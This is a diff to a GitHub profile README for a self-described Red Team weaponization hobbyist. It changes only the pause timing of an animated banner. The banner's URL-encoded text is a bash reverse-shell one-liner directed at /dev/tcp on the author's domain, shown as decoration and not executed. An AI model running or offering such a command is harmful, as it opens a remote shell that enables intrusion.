@@ -1,5 +1,5 @@
 ## 😸 Welcome To My GitHub !
-[![Typing SVG](https://readme-typing-svg.demolab.com?font=&pause=1000&color=00FF00&background=000000&vCenter=true&random=false&width=435&lines=%E2%AC%9B%3E+bash+-i+%3E%26+%2Fdev%2Ftcp%2Fhackercalico.github.io%2F443+0%3E%261)](https://git.io/typing-svg)
+[![Typing SVG](https://readme-typing-svg.demolab.com?font=&pause=1500&color=00FF00&background=000000&vCenter=true&random=false&width=435&lines=%E2%AC%9B%3E+bash+-i+%3E%26+%2Fdev%2Ftcp%2Fhackercalico.github.io%2F443+0%3E%261)](https://git.io/typing-svg)
 ## :octocat: About Me
 我是 Calico，一只专注于 Red Team 武器化的 Cyber Cat。  
 我喜欢尝试新事物、思考创新点，开发一些非常酷的黑客工具！
